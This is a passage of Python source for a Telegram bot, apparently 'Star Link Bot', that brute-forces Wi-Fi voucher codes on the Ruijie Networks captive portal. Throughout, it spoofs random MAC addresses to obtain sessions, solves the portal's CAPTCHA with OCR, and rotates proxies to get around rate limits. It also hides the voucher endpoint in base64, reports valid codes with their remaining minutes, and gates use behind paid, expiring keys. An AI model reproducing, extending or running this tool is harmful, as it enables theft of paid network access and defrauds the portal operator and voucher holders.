        await bot.send_message(chat_id, "/scan မလုပ်မီ /input ဖြင့် URL ထည့်ပါ။")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.send_message(chat_id, "Scan သည် အလုပ်လုပ်နေပြီ။")
        return

    found_count[chat_id] = 0
    retry_count[chat_id] = 0
    success_texts[chat_id] = []
    success_messages.pop(chat_id, None)
    current_scan_type[chat_id] = mode

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🛑  Stop Scan", callback_data="stop_scan"),
        types.InlineKeyboardButton("🏠  Main Menu", callback_data="main_menu")
    )

    mode_labels = {
        "6": "6 Digit Only", "7": "7 Digit Only", "8": "8 Digit Only", "9": "9 Digit Only",
        "all6": "All Mix (6)", "all7": "All Mix (7)", "all8": "All Mix (8)", "all9": "All Mix (9)"
    }
    mode_display = mode_labels.get(mode, mode)
    initial_text = f"🎯 Scan Type: {mode_display}\n━━━━━━━━━━━━━━━━━━━━━\n⏳ Initializing Scan..."

    progress_msg = await bot.send_message(chat_id, initial_text, reply_markup=markup)
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg)
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}


@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🔢 6 Digit Only", callback_data="scan_type_6"),
            types.InlineKeyboardButton("🔢 7 Digit Only", callback_data="scan_type_7"),
            types.InlineKeyboardButton("🔢 8 Digit Only", callback_data="scan_type_8"),
            types.InlineKeyboardButton("🔢 9 Digit Only", callback_data="scan_type_9"),
            types.InlineKeyboardButton("🔤 All Mix (6)", callback_data="scan_type_all6"),
            types.InlineKeyboardButton("🔤 All Mix (7)", callback_data="scan_type_all7"),
            types.InlineKeyboardButton("🔤 All Mix (8)", callback_data="scan_type_all8"),
            types.InlineKeyboardButton("🔤 All Mix (9)", callback_data="scan_type_all9"),
            types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
        )
        await bot.send_message(message.chat.id, "🎯 Choose Scan Type", reply_markup=markup)
        return
    mode = args[1]
    valid_modes = {"6", "7", "8", "9", "all6", "all7", "all8", "all9"}
    if mode not in valid_modes:
        await bot.reply_to(message, "Invalid mode!")
        return
    await trigger_scan(message, mode)


@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။")
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် အလုပ်မရှိပါ။")


async def periodic_result_saver():
    global result
    while True:
        await asyncio.sleep(30)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            await load_result()
            for item in items:
                chat_id = str(item["chat_id"])
                code_entry = item["code"]
                if chat_id not in result:
                    result[chat_id] = []
                if isinstance(code_entry, dict):
                    existing = [c for c in result[chat_id] if isinstance(c, dict) and c.get("code") == code_entry.get("code")]
                    if not existing:
                        result[chat_id].append(code_entry)
                else:
                    if code_entry not in result[chat_id]:
                        result[chat_id].append(code_entry)
            await save_result()


def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))


strings = string.ascii_lowercase + string.digits


def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))


def iter_codes(mode):
    if mode in ["6", "7", "8", "9"]:
        length = int(mode)
        total = 10 ** length
        if total <= 1_000_000:
            codes = [str(i).zfill(length) for i in range(total)]
            random.shuffle(codes)
            yield from codes
        else:
            seen = set()
            max_attempts = total * 2
            attempts = 0
            while len(seen) < total and attempts < max_attempts:
                code = "".join(random.choice(string.digits) for _ in range(length))
                if code not in seen:
                    seen.add(code)
                    yield code
                attempts += 1
                if len(seen) > 5_000_000:
                    seen.clear()
        return
    if mode in ["all6", "all7", "all8", "all9"]:
        length = int(mode.replace("all", ""))
        while True:
            yield all_generator(length)
    raise ValueError(f"Unsupported scan mode: {mode}")


def format_progress(mode, checked, total, speed, found, retry, success_codes):
    mode_labels = {
        "6": "6 Digit Only", "7": "7 Digit Only", "8": "8 Digit Only", "9": "9 Digit Only",
        "all6": "All Mix (6)", "all7": "All Mix (7)", "all8": "All Mix (8)", "all9": "All Mix (9)"
    }
    mode_display = mode_labels.get(mode, mode)
    speed_str = f"{speed:,.0f} codes/min"

    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100 if total > 0 else 0
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        progress_text = (
            f"🎯 Scan Type: {mode_display}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 Checked: {checked:,}/{total:,}\n"
            f"📊 Progress: {percent:.2f}%\n"
            f"⚡ Speed: {speed_str}\n"
            f"✅ Found: {found}\n"
            f"🔀 Proxies: {len(PROXIES) - len(dead_proxies)}/{len(PROXIES)}\n"
            f"🔄 Retry: {retry}\n[{bar}]\n"
        )
    else:
        progress_text = (
            f"🎯 Scan Type: {mode_display}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 Checked: {checked:,}\n"
            f"⚡ Speed: {speed_str}\n"
            f"✅ Found: {found}\n"
            f"🔀 Proxies: {len(PROXIES) - len(dead_proxies)}/{len(PROXIES)}\n"
            f"🔄 Retry: {retry}\n📊 Status: Running...\n"
        )

    if success_codes:
        codes_text = "\n━━━━━━━━━━━━━━━━━━━━━\n✅ SUCCESS CODES\n─────────────────────\n"
        for idx, item in enumerate(success_codes, 1):
            if isinstance(item, dict):
                codes_text += f"#{idx} 🔑 {item.get('code', '?')}\n   📦 {item.get('plan', 'Unknown')}\n"
            else:
                codes_text += f"#{idx} 🔑 {item}\n"
        progress_text += codes_text
    return progress_text


async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = None
    if mode in ["6", "7"]:
        total = 10 ** int(mode)

    checked = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    speed = 0

    if chat_id in scan_tasks:
        scan_tasks[chat_id]["scan_start"] = scan_start
        scan_tasks[chat_id]["checked"] = 0

    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    found_count[chat_id] = 0
    retry_count[chat_id] = 0

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            if time.monotonic() - last_key_check >= 600:
                if str(chat_id) != ADMIN_ID:
                    await load_auth_list(force=True)
                    if str(chat_id) not in auth_list or not check_key_expiration(auth_list[str(chat_id)]):
                        approve[chat_id] = False
                        await bot.send_message(chat_id, "သင်၏ key သက်တမ်းကုန်ပါပြီ။")
                        scan_tasks.pop(chat_id, None)
                        success_messages.pop(chat_id, None)
                        success_texts.pop(chat_id, None)
                        return
                last_key_check = time.monotonic()

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            checked += len(batch)
            if chat_id in scan_tasks:
                scan_tasks[chat_id]["checked"] = checked

            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0

            success_codes = success_texts.get(chat_id, [])
            text = format_progress(mode, checked, total, speed, found_count.get(chat_id, 0), retry_count.get(chat_id, 0), success_codes)

            markup = types.InlineKeyboardMarkup(row_width=1)
            markup.add(
                types.InlineKeyboardButton("🛑  Stop Scan", callback_data="stop_scan"),
                types.InlineKeyboardButton("🏠  Main Menu", callback_data="main_menu")
            )

            try:
                await bot.edit_message_text(text, chat_id=chat_id, message_id=progress_msg.message_id, reply_markup=markup)
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text, reply_markup=markup)
                    progress_msg.message_id = new_msg.message_id
                except Exception as err:
                    logger.error(f"Progress Message Error: {err}")

        if progress_msg:
            success_codes = success_texts.get(chat_id, [])
            finish_text = format_progress(mode, checked, total, speed, found_count.get(chat_id, 0), retry_count.get(chat_id, 0), success_codes)
            finish_text += "\n━━━━━━━━━━━━━━━━━━━━━\n✅ SCAN COMPLETED!"

            markup = types.InlineKeyboardMarkup(row_width=1)
            markup.add(types.InlineKeyboardButton("🏠  Main Menu", callback_data="main_menu"))
            try:
                await bot.edit_message_text(finish_text, chat_id=chat_id, message_id=progress_msg.message_id, reply_markup=markup)
            except Exception:
                try:
                    await bot.send_message(chat_id, finish_text, reply_markup=markup)
                except Exception as err:
                    logger.error(f"Progress Finish Message Error: {err}")

        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        found_count.pop(chat_id, None)
        retry_count.pop(chat_id, None)
        current_scan_type.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        found_count.pop(chat_id, None)
        retry_count.pop(chat_id, None)
        current_scan_type.pop(chat_id, None)


# ==================== MAC / SESSION ====================
def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)


async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'referer': session_url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            return previous_session_id
    except Exception:
        return previous_session_id


def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)


async def fetch_voucher_balance(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    try:
        url = f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}'
        async with session.get(url, headers=headers) as req:
            respond = await req.json()
            return respond.get('result', {}) or {}
    except Exception:
        return {}


async def fetch_voucher_balance_safe(session_id):
    for _ in range(3):
        connector, p_url = await get_random_proxy_connector()
        try:
            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as balance_session:
                data = await fetch_voucher_balance(balance_session, session_id)
                return data if isinstance(data, dict) else {}
        except Exception:
            if p_url:
                async with proxy_lock:
                    dead_proxies.add(p_url)
            continue
    return {}


# ==================== PERFORM CHECK ====================
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    chat_id_str = str(chat_id)
    await load_auth_list()
    if chat_id_str in auth_list:
        key_data = auth_list[chat_id_str]
        limit = key_data.get("limit", "unlimited") if isinstance(key_data, dict) else "unlimited"
        if limit != "unlimited":
            limit_num = int(limit)
            await load_result()
            used_count = len(result.get(chat_id_str, []))
            if used_count >= limit_num:
                current_task = scan_tasks.get(chat_id)
                if current_task:
                    current_task["stop"] = True
                await bot.send_message(chat_id, f"❌ Limit ({limit}) ပြည့်ပါပြီ။")
                return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    session_id = None

    for attempt in range(3):
        connector, p_url = await get_random_proxy_connector()
        timeout = aiohttp.ClientTimeout(total=20)
        try:
            async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as task_session:
                session_id = await get_session_id(task_session, session_url, None)
                if not session_id:
                    if p_url:
                        async with proxy_lock:
                            dead_proxies.add(p_url)
                    continue

                auth_code = None
                for _ in range(4):
                    try:
                        image = await Captcha_Image(task_session, session_id)
                        text = await Captcha_Text(image)
                        if not text:
                            continue
                        verified = await Varify_Captcha(task_session, session_id, text)
                        if verified:
                            auth_code = text
                            break
                    except Exception:
                        pass
                if not auth_code:
                    continue

                if not recheck:
                    current_task = scan_tasks.get(chat_id)
                    if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                        return

                data = {
                    "accessCode": code,
                    "sessionId": session_id,
                    "apiVersion": 1,
                    "authCode": auth_code,
                }
                headers = {
                    "authority": "portal-as.ruijienetworks.com",
                    "accept": "*/*",
                    "content-type": "application/json",
                    "origin": "https://portal-as.ruijienetworks.com",
                    "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
                    "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
                }
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    try:
                        _ = json.loads(response)
                    except json.JSONDecodeError:
                        logger.warning(f"JSON decode error: {response[:100]}")
        except Exception as e:
            if p_url:
                async with proxy_lock:
                    dead_proxies.add(p_url)
            continue

        if response and 'request limited' in response:
            retry_count[chat_id] = retry_count.get(chat_id, 0) + 1
            continue
        break

    if not response:
        retry_count[chat_id] = retry_count.get(chat_id, 0) + 1
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        balance_data = await fetch_voucher_balance_safe(session_id)
        profile_name = balance_data.get('profileName', 'Unknown')
        total_min = balance_data.get('totalMinutes', 0)
        remain_min = balance_data.get('remainingMinutes', 0)

        plan_str = f"Plan: {profile_name}\n   ⏳ Total: {format_time(total_min)}\n   ⌛ Remaining: {format_time(remain_min)}"

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({"code": code, "plan": plan_str})
        found_count[chat_id] = found_count.get(chat_id, 0) + 1

        await SUCCESS_CODE.put({"chat_id": chat_id, "code": {"code": code, "plan": plan_str}})

        if message:
            try:
                success_codes = success_texts.get(chat_id, [])
                lines = []
                for i, c in enumerate(success_codes, 1):
                    lines.append(f"#{i} 🔑 {c.get('code', '?')}\n   📦 {c.get('plan', 'Unknown')}")
                code_line = "\n\n".join(lines)
                text = f"✅ Success Codes:\n\n{code_line}"
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id=message.chat.id, text=text)
                    success_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(chat_id=message.chat.id, message_id=success_messages[chat_id], text=text)
                    except Exception:
                        sent = await bot.send_message(chat_id=message.chat.id, text=text)
                        success_messages[chat_id] = sent.message_id
            except Exception as e:
                logger.error(f"Success Message Error: {e}")
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if message:
            try:
                limited_line = "\n".join(limited_texts[chat_id])
                text = f"⚠️ Limited Codes:\n\n{limited_line}"
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id=message.chat.id, text=text)
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(chat_id=message.chat.id, message_id=limited_messages[chat_id], text=text)
                    except Exception:
                        sent = await bot.send_message(chat_id=message.chat.id, text=text)
                        limited_messages[chat_id] = sent.message_id
            except Exception as e:
                logger.error(f"Limited Message Error: {e}")


# ==================== OCR ====================
_ocr = ddddocr.DdddOcr(show_ad=False)


def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()


async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)


async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/*,*/*;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(int(time.time() * 1000))}
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()


async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        success = data.get("success")
        if success is True or str(success).lower() == "true":
            return session_id
        return None


# ==================== MAIN ====================
async def start_polling():
    backoff = 5
    while True:
        try:
            logger.info("🚀 Starting bot polling...")
            await bot.infinity_polling(timeout=20, request_timeout=35)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logger.error(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            logger.error(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)


async def main():
    logger.info("=" * 50)
    logger.info("🤖 Star Link Bot starting up...")
    logger.info(f"👤 Admin ID: {ADMIN_ID}")
    logger.info(f"📁 Data dir: {DATA_DIR}")
    logger.info("=" * 50)

    await load_auth_list(force=True)
    await load_result()
    await load_dead_proxies()

    asyncio.create_task(web_server())
    asyncio.create_task(periodic_result_saver())
    await start_polling()


if __name__ == '__main__':
    asyncio.run(main())
